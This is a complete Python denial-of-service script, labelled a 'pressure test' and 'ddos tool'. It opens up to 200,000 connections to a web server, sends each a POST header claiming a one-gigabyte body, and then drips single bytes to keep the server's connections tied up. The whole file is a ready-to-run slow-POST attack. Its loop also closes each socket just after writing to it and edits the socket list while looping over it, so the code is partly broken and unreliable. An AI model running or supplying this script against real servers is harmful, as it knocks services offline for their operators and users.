#!/usr/bin/env python
import socket
import time
import threading

#Pressure Test,ddos tool
#---------------------------
MAX_CONN=200000
PORT=80
HOST="127.0.0.1"
PAGE="/index.html"
#---------------------------

si = 0

buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 1000000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]

def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode("utf-8"))
            print("[  OK  ] connect "+str(i))
            socks.append(s)
        except Exception as ex:
            print("[ FAIL ] connect error:")
            print(ex)
            time.sleep(0.2)
#end def

def send_thread():
    global socks
    global si
    while True:
        for s in socks:
            try:
                s.send("f".encode("utf-8"))
                print("[  OK  ] send "+str(si))
                si += 1
            except Exception as ex:
                print("[ FAIL ] send error:")
                print(ex)
                socks.remove(s)
            s.close()
        time.sleep(0.1)
#end def

conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()